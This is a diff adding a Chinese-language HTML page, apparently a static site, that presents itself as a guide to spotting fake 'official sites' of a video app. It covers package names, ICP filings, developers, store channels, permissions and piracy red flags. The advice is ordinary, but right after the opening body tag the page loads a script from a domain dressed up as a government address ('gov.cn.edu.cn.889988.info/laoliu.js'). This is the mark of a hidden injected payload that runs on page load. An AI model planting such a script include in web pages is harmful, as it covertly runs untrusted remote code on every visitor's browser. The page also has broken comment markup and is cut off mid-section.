@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影识窗 · 认站与选片手册 - 搜"影视大全官网"前请先核这5步/官方渠道核验/远离盗链陷阱</title>
+<meta name="description" content="影识窗（yingshidaquanguanwang-h5）是一份独立的认站与选片手册：搜「影视大全官网」前，先核对包名、备案号、开发者、分发渠道、权限五项；附官方应用商店核验路径与盗版聚合站风险识别。本站非影视大全官网、非任何App下载站，不提供播放与下载。网址 https://yingshidaquanguanwang-h5.github.io">
+<meta name="keywords" content="影识窗,认站手册,影视大全官网核验,包名核对,备案号查询,应用商店正版,盗链风险识别,选片手册,远离盗版,yingshidaquanguanwang">
+<meta name="author" content="影识窗">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="format-detection" content="telephone=no">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#FAF7EE">
+<meta property="og:type" content="website">
+<meta property="og:title" content="影识窗 · 搜「官网」前，先核这五步">
+<meta property="og:description" content="不是官网，也不替谁引流。只教你一件事：怎么自己认出哪个是真的。">
+<meta property="og:url" content="https://yingshidaquanguanwang-h5.github.io">
+<link rel="canonical" href="https://yingshidaquanguanwang-h5.github.io/">
+<style>
+/* ============================================================
+   影识窗  v1  独立「认站 + 选片」手册
+   立场：不自称官网、不做承接、不递下载、不给"哪个能用"
+   视觉：证纸米白 / 核验靛蓝 / 警示朱红 / 铅字石墨
+   结构：验真五格 · 同名图谱 · 红旗清单 · 选片三分法 · 铭牌
+   ============================================================ */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Songti SC",system-ui,serif;
+  background:#FAF7EE;color:#26241F;line-height:1.85;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 9% 6%,rgba(49,77,110,.09),transparent 30%),
+    repeating-linear-gradient(0deg,transparent 0 23px,rgba(140,132,112,.045) 23px 24px);
+}
+a{text-decoration:none;color:inherit;outline:none}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:2px}
+::selection{background:#314D6E;color:#FFF9EE}
+h1,h2,h3,h4{line-height:1.28;font-weight:800;letter-spacing:.5px}
+ul{list-style:none}
+
+/* ---------- 证纸条 ---------- */
+.belt{background:#26241F;color:#DED7C6;font-size:11.5px;letter-spacing:1.3px;padding:7px 16px;display:flex;justify-content:center;gap:14px;flex-wrap:wrap;border-bottom:4px double #C8422E;font-family:monospace}
+.belt b{color:#F0C96A}
+.belt .flag{color:#E8A49A;font-weight:800}
+
+/* ---------- 导航：验讫章 ---------- */
+.nav{position:sticky;top:0;z-index:999;background:rgba(250,247,238,.97);backdrop-filter:blur(8px);border-bottom:1px solid #D6CFBE}
+.nav-in{max-width:1220px;margin:0 auto;height:64px;padding:0 20px;display:flex;align-items:center;justify-content:space-between;gap:10px}
+.stamp{display:flex;align-items:center;gap:11px;min-width:0}
+.stamp .chop{width:36px;height:36px;background:#F7F1DE;border:2.5px solid #314D6E;border-radius:50%;position:relative;flex-shrink:0;display:flex;align-items:center;justify-content:center;box-shadow:inset 0 0 0 2px rgba(49,77,110,.18)}
+.stamp .chop::before{content:"验";font-family:"Songti SC",serif;font-weight:900;font-size:16px;color:#314D6E;line-height:1}
+.stamp .chop::after{content:"";position:absolute;inset:-5px;border:1px dashed #C8422E;border-radius:50%;opacity:.75}
+.stamp .cn{font-size:19px;font-weight:900;white-space:nowrap;font-family:"Songti SC",serif}
+.stamp .cn em{font-style:normal;color:#314D6E}
+.stamp .cn .thin{color:#857D6A;font-weight:600;font-size:16px}
+.stamp .en{font-size:9px;letter-spacing:2.4px;color:#857D6A;font-family:monospace;text-transform:uppercase;white-space:nowrap}
+.nav-links{display:flex;gap:2px;flex-wrap:wrap}
+.nav-links a{font-size:13px;color:#3F3B33;padding:8px 9px;border-bottom:2px solid transparent;transition:.2s;font-weight:600}
+.nav-links a:hover{color:#314D6E;border-bottom-color:#314D6E}
+.nav-go{background:#314D6E;color:#F7F1DE;font-weight:800;font-size:13px;padding:8px 16px;border-radius:20px 4px 20px 4px;border:1.5px solid #1F3550;transition:.25s;white-space:nowrap}
+.nav-go:hover{background:#F0C96A;color:#26241F;border-color:#314D6E;transform:translateY(-2px)}
+
+/* ---------- Hero：核验单 ---------- */
+.hero{max-width:1220px;margin:0 auto;padding:50px 20px 40px;display:grid;grid-template-columns:1.12fr .88fr;gap:32px;align-items:center}
+.form{background:#FCF9F0;border:1px solid #D6CFBE;border-radius:4px;padding:26px 26px;position:relative;box-shadow:0 0 0 7px #FCF9F0,0 0 0 8px #314D6E,4px 6px 0 rgba(90,85,70,.14)}
+.form::before{content:"";position:absolute;top:10px;bottom:10px;left:10px;right:10px;border:1px solid rgba(49,77,110,.22);pointer-events:none;border-radius:2px}
+.form::after{content:"核验单 № 窗-2026-甲";position:absolute;top:16px;right:24px;font-family:"Songti SC",serif;font-size:12.5px;color:#314D6E;letter-spacing:1.6px;border-left:2px solid #314D6E;padding-left:8px}
+.form .no{font-family:monospace;font-size:11px;color:#857D6A;letter-spacing:2px;margin-bottom:8px;padding-left:4px}
+.hero h1{font-size:clamp(27px,4.8vw,48px);font-weight:900;line-height:1.12;padding-left:4px;font-family:"Songti SC",serif}
+.hero h1 em{font-style:normal;color:#314D6E;position:relative}
+.hero h1 em::after{content:"";position:absolute;left:4px;right:4px;bottom:2px;height:6px;background:rgba(240,201,106,.66)}
+.hero .sub{padding-left:4px;font-family:monospace;font-size:12px;letter-spacing:2.6px;color:#857D6A;margin-top:10px;text-transform:uppercase}
+.hero .lead{font-size:15px;color:#34312B;margin:18px 0 22px;max-width:580px;padding-left:4px}
+.hero-btns{display:flex;gap:11px;flex-wrap:wrap;padding-left:4px}
+.b1{padding:11px 24px;font-weight:800;border-radius:20px 4px 20px 4px;background:#314D6E;color:#F7F1DE;border:1.5px solid #1F3550;transition:.25s}
+.b1:hover{background:#F0C96A;color:#26241F;border-color:#314D6E;transform:translateY(-2px)}
+.b2{padding:11px 24px;font-weight:800;border-radius:20px 4px 20px 4px;background:transparent;color:#26241F;border:1.5px solid #D6CFBE;transition:.25s}
+.b2:hover{background:#26241F;color:#F7F1DE;border-color:#26241F}
+
+/* 五步速览 */
+.steps{display:grid;gap:11px}
+.step{background:#FCF9F0;border:1px solid #D6CFBE;border-left:6px solid var(--c,#314D6E);border-radius:2px 10px 10px 2px;padding:12px 16px;transition:.25s;position:relative}
+.step:hover{background:#FFFDF5;transform:translateX(3px);border-left-color:#C8422E}
+.step .k{font-family:monospace;font-size:10.5px;color:#857D6A;letter-spacing:1.4px}
+.step h4{font-size:14.5px;font-weight:900;color:#26241F;margin:2px 0 3px}
+.step h4 b{color:#314D6E;font-family:monospace;font-size:13px}
+.step p{font-size:12.6px;color:#3F3B33;line-height:1.6}
+.step .c1{border-left-color:#314D6E}.step .c2{border-left-color:#5C7A6A}
+.step .c3{border-left-color:#C89A2E}.step .c4{border-left-color:#8A6A5A}.step .c5{border-left-color:#C8422E}
+
+/* ---------- 骨架 ---------- */
+.wrap{max-width:1220px;margin:0 auto;padding:52px 20px}
+.head{display:flex;align-items:baseline;gap:12px;margin-bottom:26px;flex-wrap:wrap;border-bottom:1px solid #D6CFBE;padding-bottom:10px}
+.head .idx{font-family:"Songti SC",serif;font-size:14px;font-weight:900;color:#F7F1DE;background:#314D6E;padding:2px 11px;border-radius:3px;letter-spacing:2px}
+.head h2{font-size:23px;font-weight:900;font-family:"Songti SC",serif}
+.head h2 em{font-style:normal;color:#314D6E}
+.head .en{font-family:monospace;font-size:11px;letter-spacing:1.6px;color:#857D6A;text-transform:uppercase}
+.head a.more{margin-left:auto;font-size:13px;color:#3F3B33;font-weight:700;font-family:monospace}
+.head a.more:hover{color:#314D6E}
+
+/* ---------- 01 验真五格（流程条 + 卡） ---------- */
+.checks{display:grid;grid-template-columns:repeat(auto-fit,minmax(208px,1fr));gap:14px}
+.chk{background:#FCF9F0;border:1px solid #D6CFBE;border-radius:7px;padding:0;overflow:hidden;transition:.33s;position:relative;box-shadow:2px 3px 0 rgba(90,85,70,.11)}
+.chk:hover{transform:translateY(-6px);border-color:#314D6E;box-shadow:0 15px 26px rgba(49,77,110,.14)}
+.chk .top{height:54px;background:linear-gradient(135deg,#314D6E,#1F3550);position:relative;display:flex;align-items:center;padding:0 14px;gap:9px}
+.chk .top .n{font-family:monospace;font-weight:900;font-size:15px;color:#F0C96A;background:rgba(247,241,222,.14);width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0}
+.chk .top .tt{font-family:"Songti SC",serif;font-weight:900;font-size:15px;color:#F7F1DE;letter-spacing:.5px}
+.chk .bd{padding:14px 16px 17px}
+.chk h3{font-size:15px;font-weight:900;color:#26241F;margin-bottom:5px}
+.chk .look{font-family:monospace;font-size:11px;color:#314D6E;background:#EAE4D4;padding:4px 8px;border-radius:3px;margin:6px 0 8px;line-height:1.55}
+.chk .look b{color:#C8422E}
+.chk p{font-size:12.7px;color:#3F3B33;line-height:1.65}
+.chk .warn{margin-top:8px;font-family:monospace;font-size:10.5px;color:#C8422E;border-top:1px dashed #D6CFBE;padding-top:6px;line-height:1.5}
+.chk.danger .top{background:linear-gradient(135deg,#C8422E,#8A2A1A)}
+.chk.danger .top .n{color:#FFF3E6}
+
+/* ---------- 02 同名图谱（谁在叫这个名字） ---------- */
+.map{background:#FCF9F0;border:1px solid #D6CFBE;border-radius:8px;padding:22px;box-shadow:inset 0 0 0 6px #FCF9F0,inset 0 0 0 7px #D6CFBE}
+.legend{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:18px;font-family:monospace;font-size:11.5px;color:#5C574C}
+.legend i{display:inline-block;width:11px;height:11px;border-radius:2px;margin-right:5px;vertical-align:-1px}
+.m-row{display:grid;grid-template-columns:110px 1fr 150px;gap:14px;align-items:center;padding:11px 0;border-bottom:1px dashed #D6CFBE}
+.m-row:last-child{border-bottom:none}
+.m-row .who{font-family:"Songti SC",serif;font-weight:900;font-size:15px;color:#26241F}
+.m-row .who small{display:block;font-family:monospace;font-size:9.5px;color:#857D6A;font-weight:400;letter-spacing:.3px}
+.m-row .what{font-size:12.8px;color:#3F3B33;line-height:1.55}
+.m-row .tag{font-family:monospace;font-size:10px;font-weight:800;padding:4px 8px;border-radius:3px;text-align:center;white-space:nowrap}
+.t-real{background:#DCE7DC;color:#2F5A34;border:1px solid #9CBA9C}
+.t-case{background:#F3DFD6;color:#8A3A22;border:1px solid #D9A48E}
+.t-clone{background:#EAE4D4;color:#6A5A3C;border:1px solid #C9BEA2}
+.t-risk{background:#F6D9D4;color:#A3321C;border:1px solid #E0A89C}
+.m-row .tag small{display:block;font-weight:400;font-size:9px;opacity:.8;margin-top:1px}
+
+/* ---------- 03 红旗清单（翻牌） ---------- */
+.flags{display:grid;grid-template-columns:repeat(auto-fit,minmax(255px,1fr));gap:15px}
+.flag{height:200px;perspective:1400px}
+.flag-in{position:relative;width:100%;height:100%;transition:transform .6s;transform-style:preserve-3d}
+.flag:hover .flag-in{transform:rotateY(180deg)}
+.f-face{position:absolute;inset:0;backface-visibility:hidden;border-radius:6px;padding:18px 20px;border:1px solid #D6CFBE;overflow:hidden}
+.f-front{background:#FCF9F0;box-shadow:2px 3px 0 rgba(90,85,70,.11)}
+.f-front .ribbon{position:absolute;top:-6px;left:14px;background:#C8422E;color:#FFF3E6;font-family:monospace;font-size:9.5px;font-weight:800;padding:3px 9px;border-radius:0 0 3px 3px;transform:rotate(-1.5deg)}
+.f-front .no{font-family:monospace;font-size:10px;color:#857D6A;letter-spacing:1.2px}
+.f-front h3{font-size:17px;font-weight:900;color:#26241F;margin:7px 0 5px;font-family:"Songti SC",serif}
+.f-front .hint{position:absolute;bottom:13px;left:20px;right:20px;font-family:monospace;font-size:10px;color:#A89E88;border-top:1px dashed #D6CFBE;padding-top:6px}
+.f-back{background:#C8422E;color:#FFF3E6;transform:rotateY(180deg);border-color:#8A2A1A}
+.f-back h4{font-size:12px;font-weight:800;font-family:monospace;letter-spacing:.5px;margin-bottom:7px}
+.f-back p{font-size:13.3px;line-height:1.7;color:#FFE9DF}
+.f-back .do{margin-top:10px;font-family:monospace;font-size:10.5px;color:#F0C96A;border-top:1px dashed rgba(255,243,230,.4);padding-top:7px;line-height:1.5}
+
+/* ---------- 04 选片三分法 ---------- */
+.tri{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
+.tri-card{background:#FCF9F0;border:1px solid #D6CFBE;border-top:6px solid var(--c,#314D6E);border-radius:5px;padding:17px 18px;transition:.3s}
+.tri-card:hover{background:#FFFDF5;transform:translateY(-5px);box-shadow:0 14px 24px rgba(49,77,110,.12)}
+.tri-card .cat{font-family:monospace;font-size:10px;color:#857D6A;letter-spacing:1.4px;font-weight:800}
+.tri-card h3{font-size:17px;font-weight:900;color:#26241F;margin:3px 0 6px;font-family:"Songti SC",serif}
+.tri-card p{font-size:13.2px;color:#3F3B33;line-height:1.7}
+.tri-card .path{margin-top:10px;font-size:12px;color:#314D6E;border-top:1px dashed #D6CFBE;padding-top:7px;line-height:1.55}
+.tri-card .path b{color:#C8422E;font-family:monospace}
+
+/* ---------- 铭牌 ---------- */
+.plaque{max-width:1220px;margin:0 auto;padding:0 20px 12px}
+.plaque-in{background:#26241F;border:2px solid #314D6E;border-radius:4px;padding:24px 26px;display:flex;gap:18px;align-items:center;flex-wrap:wrap;justify-content:space-between;position:relative;overflow:hidden}
+.plaque-in::before{content:"窗";position:absolute;right:18px;top:-30px;font-size:92px;font-weight:900;color:rgba(49,77,110,.18);font-family:"Songti SC",serif;line-height:1}
+.plaque-in .lab{font-family:monospace;font-size:11px;letter-spacing:2px;color:#F0C96A}
+.plaque-in .u{font-size:clamp(14px,3vw,21px);font-weight:900;color:#F0C96A;word-break:break-all;font-family:"Songti SC",monospace}
+.plaque-in .u a{color:#F0C96A;border-bottom:1.5px dashed #314D6E}
+.plaque-in .u a:hover{color:#fff}
+.plaque-in .note{font-size:12px;color:#DED7C6;text-align:right}
+
+/* ---------- 关于 ---------- */
+.about{max-width:1220px;margin:0 auto;padding:52px 20px;display:grid;grid-template-columns:1fr 1fr;gap:34px;align-items:center;background:#FCF9F0;border:1px solid #D6CFBE;box-shadow:0 0 0 7px #FCF9F0,0 0 0 8px #314D6E;border-radius:4px}
+.about h2{font-size:23px;font-weight:900;margin-bottom:14px;font-family:"Songti SC",serif}
+.about h2 em{font-style:normal;color:#314D6E}
+.about p{font-size:15px;color:#34312B;line-height:1.95;margin-bottom:12px}
+.about .u2{color:#314D6E;font-weight:800;font-family:monospace;font-size:15px}
+.tiles{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.tile{background:#FAF7EE;border:1px solid #D6CFBE;border-radius:6px;padding:16px;text-align:center}
+.tile .n{font-family:monospace;font-size:18px;font-weight:900;color:#314D6E}
+.tile .l{font-size:12px;color:#6A6558;margin-top:2px}
+
+/* ---------- 页脚 ---------- */
+.foot{border-top:4px double #C8422E;padding:36px 20px 26px;text-align:center;background:#EFE9DA}
+.foot-logo{font-size:19px;font-weight:900;color:#26241F;font-family:"Songti SC",serif;letter-spacing:.5px}
+.foot-logo em{font-style:normal;color:#314D6E}
+.foot-nav{display:flex;justify-content:center;gap:15px;flex-wrap:wrap;margin:14px 0;font-family:monospace;font-size:13px}
+.foot-nav a{color:#6A6558}
+.foot-nav a:hover{color:#314D6E}
+.foot p{font-size:12px;color:#7A7364}
+.foot .cut{margin:14px auto 10px;display:inline-block;border:1.5px solid #C8422E;color:#8A2A1A;font-family:monospace;font-size:11.5px;font-weight:800;padding:7px 15px;border-radius:20px 4px 20px 4px;background:#F6DFD4;max-width:820px;line-height:1.6}
+.foot .legal{margin-top:10px;max-width:900px;margin-left:auto;margin-right:auto;color:#6A6558;line-height:1.8;font-size:12px}
+
+/* ---------- 响应式 ---------- */
+@media(max-width:880px){
+  .nav-links{display:none}
+  .hero{grid-template-columns:1fr;padding:28px 20px 34px;gap:26px}
+  .about{grid-template-columns:1fr;padding:30px 20px}
+  .wrap{padding:42px 20px}
+  .nav-in{height:58px}
+  .stamp .en{display:none}
+  .m-row{grid-template-columns:96px 1fr;gap:10px}
+  .m-row .tag{display:none}
+}
+@media(max-width:420px){
+  .hero h1{font-size:25px}
+  .head h2{font-size:20px}
+  .checks{grid-template-columns:1fr}
+  .legend{gap:8px;font-size:10.5px}
+}
+@media print{
+  .nav,.nav-go,.belt{display:none}
+  body{background:#fff;color:#000}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- ===== 证纸条 ===== -->
+<div class="belt">
+  <span>影识窗 · 认站与选片手册</span><b>不是官网 · 不递下载 · 不荐任何 App</b>
+  <span class="flag">⚑ 搜"官网"前，先核五步</span>
+  <span>核验 / 识仿 / 选片 / 止损</span>
+</div>
+
+<!-- ===== 导航 ===== -->
+<div class="nav">
+  <div class="nav-in">
+    <div class="stamp">
+      <div class="chop"></div>
+      <div>
+        <div class="cn">影识<em>窗</em><span class="thin"> · 认站与选片手册</span></div>
+        <div class="en">Verification Window · Not an Official Site</div>
+      </div>
+    </div>
+    <nav class="nav-links">
+      <a href="#check">验真五步</a>
+      <a href="#map">同名图谱</a>
+      <a href="#flag">八面红旗</a>
+      <a href="#tri">选片三分</a>
+      <a href="#about">为何只是窗</a>
+    </nav>
+    <a href="#check" class="nav-go">开始核验 →</a>
+  </div>
+</div>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="top">
+  <div>
+    <div class="form">
+      <div class="no">FORM № 窗-2026-甲 · 搜"官网"之前先填</div>
+      <h1>你搜的是<em>官网</em>，<br>但"官网"自己也得验</h1>
+      <div class="sub">Verify First · Download Never · 这一页只教你认，不替你选</div>
+      <p class="lead">同一个名字，市面上有正版分发版、被通报整改过的旧版、挂着同名的下载站、境外老域名上的"云点播＋迅雷下载"，还有当年那桩盗链大案里同名的一款。它们长得几乎一样，差别在<b>包名、备案号、开发者、分发渠道、要的权限</b>这五格。填完这五格，你比 90% 的人清醒。</p>
+      <div class="hero-btns">
+        <a href="#check" class="b1">🕵️ 核这五格</a>
+        <a href="#map" class="b2">🗺 看同名图谱</a>
+      </div>
+    </div>
+  </div>
+  <aside class="steps" aria-label="核验五步速览">
+    <div class="step c1"><span class="k">STEP 01 · 包名</span><h4>先看 <b>com.le123.ysdq</b></h4><p>正版那款的包名是固定的。凡让你装"同名但包名不同"的，一律当仿品——改名只要三秒，包名改不了假。</p></div>
+    <div class="step c2"><span class="k">STEP 02 · 备案号</span><h4>对 <b>浙ICP备18007629号-5A</b></h4><p>工信部备案系统里能反查到主办单位。查不到、号对不上、或者写"备案中"的，关掉。</p></div>
+    <div class="step c3"><span class="k">STEP 03 · 开发者</span><h4>认 <b>金华锦尚科技</b></h4><p>应用商店详情页的"开发者／运营商"一栏要能对上主体。同名 App 出现"个人""互联网""某某工作室"，不是它。</p></div>
+    <div class="step c4"><span class="k">STEP 04 · 渠道</span><h4>只走 <b>官方应用商店</b></h4><p>网页弹的"高速下载器"、扫码装的 apk、群里发的安装包，一律不走。渠道本身就是身份证明。</p></div>
+    <div class="step c5"><span class="k">STEP 05 · 权限</span><h4>要 <b>通讯录／定位／相册全权</b> 就撤</h4><p>一个看片工具读你通讯录干嘛？权限越界不是"体验更好"，是被通报过的老毛病，别再交一次。</p></div>
+  </aside>
+</section>
+
+<!-- ===== 01 验真五格 ===== -->
+<section class="wrap" id="check">
+  <div class="head">
+    <span class="idx">第一格 · 验</span>
+    <h2>验真<em>五格</em></h2>
+    <span class="en">Five Fields · 逐格核，一格都不能省</span>
+    <a href="#" class="more">打印自核 #</a>
+  </div>
+  <div class="checks">
+    <article class="chk">
+      <div class="top"><span class="n">1</span><span class="tt">包名</span></div>
+      <div class="bd">
+        <h3>唯一 ID，改不了假</h3>
+        <div class="look">应核对：<b>com.le123.ysdq</b><br>安卓：设置→应用→右上角「高级」可看</div>
+        <p>图标和名字三天两头被抄，包名是系统级的身份证。只要这串对不上，界面做得再像也是另一家的东西。</p>
+        <div class="warn">⚠ 见到 com.qimishipin / com.xxx.ys 之类近似拼写 → 立刻停。</div>
+      </div>
+    </article>
+    <article class="chk">
+      <div class="top"><span class="n">2</span><span class="tt">备案号</span></div>
+      <div class="bd">
+        <h3>工信部可反查的那个号</h3>
+        <div class="look">应核对：<b>浙ICP备18007629号-5A</b><br>工信部 ICP/IP/域名信息备案管理系统 → 公共查询</div>
+        <p>备案号不是贴纸上随便印的。能查到主办单位、能跟开发者对上，才算数；查不到的号，等于没有。</p>
+        <div class="warn">⚠ 只有"备案中""境外节点免备案"当借口 → 走。</div>
+      </div>
+    </article>
+    <article class="chk">
+      <div class="top"><span class="n">3</span><span class="tt">开发者</span></div>
+      <div class="bd">
+        <h3>主体要对得上脸</h3>
+        <div class="look">应核对：<b>金华锦尚科技有限公司</b><br>应用商店详情页「开发者／运营商／版权」三处一致</div>
+        <p>同一名字底下换过几茬主体：有一版显示重庆某网络公司，有一版挂"上海快猫"体系，还有一堆不写主体的下载站。名字相同，公司不同，就是不同的人。</p>
+        <div class="warn">⚠ 开发者写"个人""互联网""未认证" → 不是这一款。</div>
+      </div>
+    </article>
+    <article class="chk">
+      <div class="top"><span class="n">4</span><span class="tt">分发渠道</span></div>
+      <div class="bd">
+        <h3>渠道就是身份证明</h3>
+        <div class="look">只走：<b>手机自带应用商店 / 官方商店页</b><br>拒绝：网页"高速下载器"、二维码直装、群文件 apk</div>
+        <p>正版不需要你"绕过商店"。凡是要你先下个下载器、再下主程序的，那个下载器才是它真正想装的。</p>
+        <div class="warn">⚠ 搜出来一堆"官网"，认准商店里的开发者名，别认域名长得像。</div>
+      </div>
+    </article>
+    <article class="chk danger">
+      <div class="top"><span class="n">5</span><span class="tt">权限</span></div>
+      <div class="bd">
+        <h3>要得多的，一律撤</h3>
+        <div class="look">红线权限：<b>通讯录 · 精确定位 · 相册全量 · 短信 · 麦克风</b></div>
+        <p>这款产品历史上就栽在这条上：超范围收集、强制频繁索取、违规调用通讯录和定位，被工信部点名三次，其中一次是"回头看"时还没改完。所以这一格不是吹毛求疵，是有前科的。</p>
+        <div class="warn">⚠ 装完第一次弹权限 → 先选"仅使用期间"；读通讯录的直接卸载。</div>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- ===== 02 同名图谱 ===== */
+<section class="wrap" id="map" style="background:rgba(49,77,110,.05)">
+  <div class="head">
+    <span class="idx">第二格 · 图</span>
+    <h2>同名<em>图谱</em></h2>
+    <span class="en">Who Else Answers to This Name</span>
+    <a href="#" class="more">看清谁是谁 #</a>
+  </div>
+  <div class="map">
+    <div class="legend">
+      <span><i style="background:#2F5A34"></i>可核验正版分发</span>
+      <span><i style="background:#8A3A22"></i>司法案件关联</span>
+      <span><i style="background:#6A5A3C"></i>同名换皮/仿站</span>
+      <span><i style="background:#A3321C"></i>高风险旧域名</span>
+    </div>
+    <div class="m-row"><div class="who">影视大全<small>应用商店正版分发版</small></div>
+      <div class="what">包名 <b>com.le123.ysdq</b>，备案 浙ICP备18007629号-5A，开发者金华锦尚科技有限公司，应用宝／App Store 可查到详情页与开发者主体。这是目前能核验到的那一个。</div>
+      <div class="tag t-real">✓ 可核验<small>走官方商店</small></div></div>
+    <div class="m-row"><div class="who">影视大全纯净版<small>2017—2023 运营</small></div>
+      <div class="what">无锡"盗链第一大案"涉案 8 款 App 之一：技术解析＋下载上传，盗播 8.3 万部、点击 4050 亿次、获利 3.92 亿。主犯侵犯著作权罪判 5 年 6 个月、罚 2000 万。这个名字现在搜得到，案子也还在裁判文书里。</div>
+      <div class="tag t-case">✕ 同案号<small>别再装</small></div></div>
+    <div class="m-row"><div class="who">七七／月亮／开心／青草<small>剧多多影视大全</small></div>
+      <div class="what">工信部一次通报里连着点名的一串"影视大全"变种，加"免费追剧""蓝光终极版""8 周年"之类前缀后缀。名字蹭的是辨识度，包名和主体各是各的。</div>
+      <div class="tag t-clone">△ 换皮族<small>按包名判</small></div></div>
+    <div class="m-row"><div class="who">yingshidaquan.com<small>12 年老域名</small></div>
+      <div class="what">挂的是"无广告在线云点播＋迅雷电影下载＋各大站云播"，相似站推荐直接连到飘花、6v电影、3edyy、字幕组站。服务器境内，域名 2027 才到期。这类站不署名主体、不谈版权。</div>
+      <div class="tag t-risk">✕ 高风险<small>不进</small></div></div>
+    <div class="m-row"><div class="who">yingshidq.net ／ 2345 跳转<small>下载站指的路</small></div>
+      <div class="what">多家软件下载站把"官网"写成这个地址。注意：下载站说的"官网"只是它自己填的一栏，不是工信部备案主体，别当成核验依据。</div>
+      <div class="tag t-clone">△ 二手指路<small>以备案系统为准</small></div></div>
+    <div class="m-row"><div class="who">ys-daquan / yingshidaq<small>两个"影评社区"壳</small></div>
+      <div class="what">一个自称"海量佳片＋AI 推荐 3.0，准确率 94%"，一个写"原声优先·零滤镜·真实短片聚合"。内容站不是 App 分发方，也没有同一备案链。当内容看可以，别当成下载入口。</div>
+      <div class="tag t-clone">△ 同名内容站<small>不递链</small></div></div>
+    <div class="m-row"><div class="who">影视大全看看 ／ 快看 ／ 高清版<small>商店专题里的并列项</small></div>
+      <div class="what">应用商店自己写的"追剧神器"合集里，把《影视大全》《影视大全看看》《影视大全快看》《月亮影视大全》并排推荐。商店专题不等于官方家族，逐个核包名才是真。</div>
+      <div class="tag t-clone">△ 商店误读<small>别信"全家桶"</small></div></div>
+  </div>
+</section>
+
+<!-- ===== 03 八面红旗 ===== */
+<section class="wrap" id="flag">
+  <div class="head">
+    <span class="idx">第三格 · 旗</span>
+    <h2>八面<em>红旗</em></h2>
+    <span class="en">Eight Red Flags · Hover to Flip for the Fix</span>
+    <a href="#" class="more">全翻 #</a>
+  </div>
+  <div class="flags">
+    <div class="flag"><div class="flag-in">
+      <div class="f-face f-front"><span class="ribbon">红旗 1</span><span class="no">INSTALLER</span><h3>"高速下载器"先落地</h3><p>正版是商店一键装，它让你先下个 3MB 的"下载器"。那个才是本体。</p><div class="hint">↻ 悬停看应对</div></div>
+      <div class="f-face f-back"><h4>应对</h4><p>关掉页面，去手机自带商店手动搜开发者全名。凡是"先装助手"的，助手就是它真正要装的。</p><div class="do">DO：只认商店原生安装按钮</div></div>
+    </div></div>
+    <div class="flag"><div class="flag-in">
+      <div class="f-face f-front"><span class="ribbon">红旗 2</span><span class="no">DOMAIN</span><h3>域名长得像，但不是它</h3><p>"官网"二字谁都能写进标题。下载站自己填的官网地址，连主体都不用证明。</p><div class="hint">↻ 悬停看应对</div></div>
+      <div class="f-face f-back"><h4>应对</h4><p>别认域名，认备案号。把号粘进工信部公共查询，看主办单位是不是那个公司。</p><div class="do">DO：备案号反查 > 域名长相</div></div>
+    </div></div>
+    <div class="flag"><div class="flag-in">
+      <div class="f-face f-front"><span class="ribbon">红旗 3</span><span class="no">PERMISSION</span><h3>要看你通讯录的"看片软件"</h3><p>一部片子不需要知道你联系人叫什么。这条它栽过三次通报，别给它第四次机会。</p><div class="hint">↻ 悬停看应对</div></div>
+      <div class="f-face f-back"><h4>应对</h4><p>装完第一次弹窗一律"仅使用期间"；要通讯录／短信／麦克风的直接系统里卸载，不留后台。</p><div class="do">DO：权限最小化，宁可功能少</div></div>
+    </div></div>
+    <div class="flag"><div class="flag-in">
+      <div class="f-face f-front"><span class="ribbon">红旗 4</span><span class="no">UPDATE</span><h3>"最新版"只在弹窗里更新</h3><p>站内推送"版本过旧，点此升级"，跳浏览器下 apk。正版升级走商店，不走弹窗。</p><div class="hint">↻ 悬停看应对</div></div>
+      <div class="f-face f-back"><h4>应对</h4><p>一律去商店点更新。弹窗那条路关掉，连"取消"都别点——有时候取消也计时跳转。</p><div class="do">DO：更新只走商店页</div></div>
+    </div></div>
+    <div class="flag"><div class="flag-in">
+      <div class="f-face f-front"><span class="ribbon">红旗 5</span><span class="no">SOURCE</span><h3>免登录、秒出全集、同步院线</h3><p>院线刚上就"高清全集"，不是技术神，是没付钱的那一侧。越顺，越贵。</p><div class="hint">↻ 悬停看应对</div></div>
+      <div class="f-face f-back"><h4>应对</h4><p>热映片就去院线或正版平台等窗口。免费那口"同步"的代价，是广告分成、是画像、有时候是木马。</p><div class="do">DO：新片付费，是最便宜的版本</div></div>
+    </div></div>
+    <div class="flag"><div class="flag-in">
+      <div class="f-face f-front"><span class="ribbon">红旗 6</span><span class="no">POPUP</span><h3>弹窗往"加群领更多"走</h3><p>一旦让你扫码进群、找客服领资源，故事就换了：后面是代理卡密、分佣、垫付那一整套。</p><div class="hint">↻ 悬停看应对</div></div>
+      <div class="f-face f-back"><h4>应对</h4><p>页面立刻关，群一个都不进。已经进过的，别填手机号、别转一分钱、别装"客服"发的任何包。</p><div class="do">DO：二维码＝停止线</div></div>
+    </div></div>
+    <div class="flag"><div class="flag-in">
+      <div class="f-face f-front"><span class="ribbon">红旗 7</span><span class="no">CERT</span><h3>证书过期还在跑，域名月月换</h3><p>HTTPS 小锁都挂不住的站，还告诉你"备用地址收藏一下"。它自己也知道活不长。</p><div class="hint">↻ 悬停看应对</div></div>
+      <div class="f-face f-back"><h4>应对</h4><p>证书报警就停。需要"收藏备用域名"才能活的站，本质是打一枪换一个地方，你不是用户，是流量。</p><div class="do">DO：报警＝离场，别加书签</div></div>
+    </div></div>
+    <div class="flag"><div class="flag-in">
